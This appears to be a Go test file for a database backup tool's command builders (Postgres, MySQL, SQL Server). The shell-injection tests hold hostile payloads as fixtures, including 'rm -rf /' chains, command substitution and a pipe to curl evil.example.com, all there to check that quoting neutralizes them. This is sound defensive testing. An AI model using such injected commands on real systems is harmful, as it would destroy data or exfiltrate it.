package scheduler

import (
	"errors"
	"strings"
	"testing"

	"backapeando-backup-manager/internal/domain"
)

func dockerServer(engine domain.DBEngine, containerName string) domain.Server {
	return domain.Server{
		DBEngine:       engine,
		DeploymentMode: domain.DeploymentModeDocker,
		ContainerName:  &containerName,
		DBUser:         "app_user",
		DBName:         "app_db",
	}
}

func hostServer(engine domain.DBEngine) domain.Server {
	return domain.Server{
		DBEngine:       engine,
		DeploymentMode: domain.DeploymentModeHost,
		DBUser:         "app_user",
		DBName:         "app_db",
	}
}

// assertNoUnquotedShellMetachars walks s tracking whether we are inside a
// single-quoted region (POSIX single quotes: no escapes recognized except
// the '\” idiom used by ShellQuote itself, which closes, escapes a quote,
// then reopens). It returns an error if any of ';', '|', '&', '`', "$(" is
// found while not inside single quotes.
func assertNoUnquotedShellMetachars(s string) error {
	inQuotes := false
	runes := []rune(s)
	for i := 0; i < len(runes); i++ {
		// Recognize ShellQuote's "'\''" idiom for an embedded single quote
		// (close-quote, backslash-escaped literal quote, reopen-quote): a
		// real shell treats these four runes as still part of the same
		// quoted argument on both sides, so skip over them as a unit
		// instead of naively toggling inQuotes on each of the three quote
		// characters within it (which would incorrectly flag the content
		// immediately after as "unquoted").
		if i+3 < len(runes) && runes[i] == '\'' && runes[i+1] == '\\' && runes[i+2] == '\'' && runes[i+3] == '\'' {
			i += 3
			continue
		}
		r := runes[i]
		switch r {
		case '\'':
			inQuotes = !inQuotes
		case ';', '|', '&', '`':
			if !inQuotes {
				return errors.New("unquoted metacharacter '" + string(r) + "' found outside single quotes")
			}
		case '$':
			if !inQuotes && i+1 < len(runes) && runes[i+1] == '(' {
				return errors.New("unquoted '$(' command substitution found outside single quotes")
			}
		case '\n':
			if !inQuotes {
				return errors.New("unquoted newline found outside single quotes")
			}
		}
	}
	return nil
}

// --- Postgres ---

func TestBuildPgDumpCommand_DockerNoPassword(t *testing.T) {
	server := dockerServer(domain.DBEnginePostgres, "pg-container")
	cmd := buildPgDumpCommand(server, "")
	want := "docker exec pg-container pg_dump -U app_user -Fc app_db"
	if cmd != want {
		t.Errorf("got %q, want %q", cmd, want)
	}
}

func TestBuildPgDumpCommand_HostNoPassword(t *testing.T) {
	server := hostServer(domain.DBEnginePostgres)
	cmd := buildPgDumpCommand(server, "")
	want := "pg_dump -U app_user -Fc app_db"
	if cmd != want {
		t.Errorf("got %q, want %q", cmd, want)
	}
}

func TestBuildPgDumpCommand_DockerWithPassword(t *testing.T) {
	server := dockerServer(domain.DBEnginePostgres, "pg-container")
	cmd := buildPgDumpCommand(server, "s3cret")
	// The whole "NAME=value" env assignment is one shell word, quoted as a
	// unit because it contains '=' (docker exec's own -e flag then splits
	// it on the first '=' once docker, not the shell, parses it).
	want := "docker exec -e 'PGPASSWORD=s3cret' pg-container pg_dump -U app_user -Fc app_db"
	if cmd != want {
		t.Errorf("got %q, want %q", cmd, want)
	}
}

func TestBuildPgDumpCommand_HostWithPassword(t *testing.T) {
	server := hostServer(domain.DBEnginePostgres)
	cmd := buildPgDumpCommand(server, "s3cret")
	want := "PGPASSWORD=s3cret pg_dump -U app_user -Fc app_db"
	if cmd != want {
		t.Errorf("got %q, want %q", cmd, want)
	}
}

func TestBuildPgDumpCommand_WithExtraArgs(t *testing.T) {
	server := dockerServer(domain.DBEnginePostgres, "pg-container")
	server.PgDumpExtraArgs = "--no-owner --compress=9"
	cmd := buildPgDumpCommand(server, "")
	if !strings.Contains(cmd, "--no-owner") || !strings.Contains(cmd, "--compress=9") {
		t.Errorf("expected extra args to be present, got: %s", cmd)
	}
	if !strings.HasSuffix(cmd, "app_db") {
		t.Errorf("expected dbName to be the last token, got: %s", cmd)
	}
}

func TestBuildPgDumpCommand_ShellInjectionNeutralized(t *testing.T) {
	tests := []struct {
		name      string
		extraArgs string
	}{
		{"semicolon command chaining", "; touch /tmp/pwned #"},
		{"pipe to another command", "| curl evil.example.com/x"},
		{"background and shell metachars", "&& rm -rf / &"},
		{"backtick command substitution", "`whoami`"},
		{"dollar-paren command substitution", "$(whoami)"},
		{"newline injection", "--verbose\nrm -rf /"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			server := dockerServer(domain.DBEnginePostgres, "pg-container")
			server.PgDumpExtraArgs = tt.extraArgs
			cmd := buildPgDumpCommand(server, "")
			if err := assertNoUnquotedShellMetachars(cmd); err != nil {
				t.Fatalf("command contains an unquoted shell metacharacter: %v\ncommand: %s", err, cmd)
			}
		})
	}
}

func TestBuildPgDumpCommand_PasswordInjectionNeutralized(t *testing.T) {
	server := dockerServer(domain.DBEnginePostgres, "pg-container")
	cmd := buildPgDumpCommand(server, "'; rm -rf / #")
	if err := assertNoUnquotedShellMetachars(cmd); err != nil {
		t.Fatalf("command contains an unquoted shell metacharacter from password: %v\ncommand: %s", err, cmd)
	}
}

// --- MySQL ---

func TestBuildMySQLDumpCommand_DockerAlwaysHasPassword(t *testing.T) {
	server := dockerServer(domain.DBEngineMySQL, "mysql-container")
	cmd := buildMySQLDumpCommand(server, "s3cret")
	want := "docker exec -e 'MYSQL_PWD=s3cret' mysql-container mysqldump -u app_user app_db"
	if cmd != want {
		t.Errorf("got %q, want %q", cmd, want)
	}
}

func TestBuildMySQLDumpCommand_Host(t *testing.T) {
	server := hostServer(domain.DBEngineMySQL)
	cmd := buildMySQLDumpCommand(server, "s3cret")
	want := "MYSQL_PWD=s3cret mysqldump -u app_user app_db"
	if cmd != want {
		t.Errorf("got %q, want %q", cmd, want)
	}
}

func TestBuildMySQLDumpCommand_ShellInjectionNeutralized(t *testing.T) {
	server := dockerServer(domain.DBEngineMySQL, "mysql-container")
	server.MySQLDumpExtraArgs = "; rm -rf / #"
	cmd := buildMySQLDumpCommand(server, "; rm -rf / #")
	if err := assertNoUnquotedShellMetachars(cmd); err != nil {
		t.Fatalf("command contains an unquoted shell metacharacter: %v\ncommand: %s", err, cmd)
	}
}

// --- SQL Server ---

func TestBuildSQLServerDumpPlan_Docker(t *testing.T) {
	server := dockerServer(domain.DBEngineSQLServer, "mssql-container")
	plan := buildSQLServerDumpPlan(server, "s3cret")

	if !strings.Contains(plan.PreCmd, "docker exec -e 'SQLCMDPASSWORD=s3cret' mssql-container sqlcmd") {
		t.Errorf("PreCmd missing expected docker/env prefix: %s", plan.PreCmd)
	}
	if !strings.Contains(plan.PreCmd, "BACKUP DATABASE") || !strings.Contains(plan.PreCmd, "app_db") {
		t.Errorf("PreCmd missing BACKUP DATABASE statement: %s", plan.PreCmd)
	}
	if !strings.HasPrefix(plan.StreamCmd, "docker exec mssql-container cat '/tmp/backapeando-sqlserver-") {
		t.Errorf("StreamCmd unexpected: %s", plan.StreamCmd)
	}
	if !strings.HasPrefix(plan.CleanupCmd, "docker exec mssql-container rm -f '/tmp/backapeando-sqlserver-") {
		t.Errorf("CleanupCmd unexpected: %s", plan.CleanupCmd)
	}
}

func TestBuildSQLServerDumpPlan_Host(t *testing.T) {
	server := hostServer(domain.DBEngineSQLServer)
	plan := buildSQLServerDumpPlan(server, "s3cret")

	if !strings.HasPrefix(plan.PreCmd, "SQLCMDPASSWORD=s3cret sqlcmd") {
		t.Errorf("PreCmd unexpected: %s", plan.PreCmd)
	}
	if !strings.HasPrefix(plan.StreamCmd, "cat '/tmp/backapeando-sqlserver-") {
		t.Errorf("StreamCmd unexpected: %s", plan.StreamCmd)
	}
	if !strings.HasPrefix(plan.CleanupCmd, "rm -f '/tmp/backapeando-sqlserver-") {
		t.Errorf("CleanupCmd unexpected: %s", plan.CleanupCmd)
	}
}

func TestBuildSQLServerDumpPlan_TempPathConsistentAcrossCommands(t *testing.T) {
	server := hostServer(domain.DBEngineSQLServer)
	plan := buildSQLServerDumpPlan(server, "s3cret")

	// Extract the temp path from StreamCmd ("cat <path>") and confirm it
	// also appears in PreCmd's BACKUP DATABASE clause and in CleanupCmd.
	path := strings.TrimPrefix(plan.StreamCmd, "cat ")
	if !strings.Contains(plan.PreCmd, path) {
		t.Errorf("PreCmd does not reference the same temp path as StreamCmd: PreCmd=%s path=%s", plan.PreCmd, path)
	}
	if !strings.Contains(plan.CleanupCmd, path) {
		t.Errorf("CleanupCmd does not reference the same temp path as StreamCmd: CleanupCmd=%s path=%s", plan.CleanupCmd, path)
	}
}

func TestBuildSQLServerDumpPlan_TempPathUniquePerCall(t *testing.T) {
	server := hostServer(domain.DBEngineSQLServer)
	plan1 := buildSQLServerDumpPlan(server, "s3cret")
	plan2 := buildSQLServerDumpPlan(server, "s3cret")
	if plan1.StreamCmd == plan2.StreamCmd {
		t.Errorf("expected distinct temp paths across calls, got the same StreamCmd twice: %s", plan1.StreamCmd)
	}
}

func TestBuildSQLServerDumpPlan_ShellInjectionNeutralized(t *testing.T) {
	tests := []struct {
		name      string
		dbName    string
		extraArgs string
		password  string
	}{
		{"malicious dbName", "db`; rm -rf / #", "", "pw"},
		{"malicious extra args", "app_db", "; rm -rf / #", "pw"},
		{"malicious password", "app_db", "", "'; rm -rf / #"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			server := hostServer(domain.DBEngineSQLServer)
			server.DBName = tt.dbName
			server.SqlCmdExtraArgs = tt.extraArgs
			plan := buildSQLServerDumpPlan(server, tt.password)
			for _, cmd := range []string{plan.PreCmd, plan.StreamCmd, plan.CleanupCmd} {
				if err := assertNoUnquotedShellMetachars(cmd); err != nil {
					t.Fatalf("command contains an unquoted shell metacharacter: %v\ncommand: %s", err, cmd)
				}
			}
		})
	}
}

// --- BuildDumpPlan dispatch ---

func TestBuildDumpPlan_DispatchesByEngine(t *testing.T) {
	cases := []struct {
		engine       domain.DBEngine
		expectPreCmd bool
	}{
		{domain.DBEnginePostgres, false},
		{domain.DBEngineMySQL, false},
		{domain.DBEngineSQLServer, true},
	}
	for _, tc := range cases {
		t.Run(string(tc.engine), func(t *testing.T) {
			server := dockerServer(tc.engine, "container")
			plan, err := BuildDumpPlan(server, "pw")
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if plan.StreamCmd == "" {
				t.Error("expected non-empty StreamCmd")
			}
			if (plan.PreCmd != "") != tc.expectPreCmd {
				t.Errorf("PreCmd presence = %v, want %v", plan.PreCmd != "", tc.expectPreCmd)
			}
		})
	}
}

func TestBuildDumpPlan_UnsupportedEngine(t *testing.T) {
	server := dockerServer(domain.DBEngine("oracle"), "container")
	if _, err := BuildDumpPlan(server, ""); err == nil {
		t.Error("expected error for unsupported engine, got nil")
	}
}
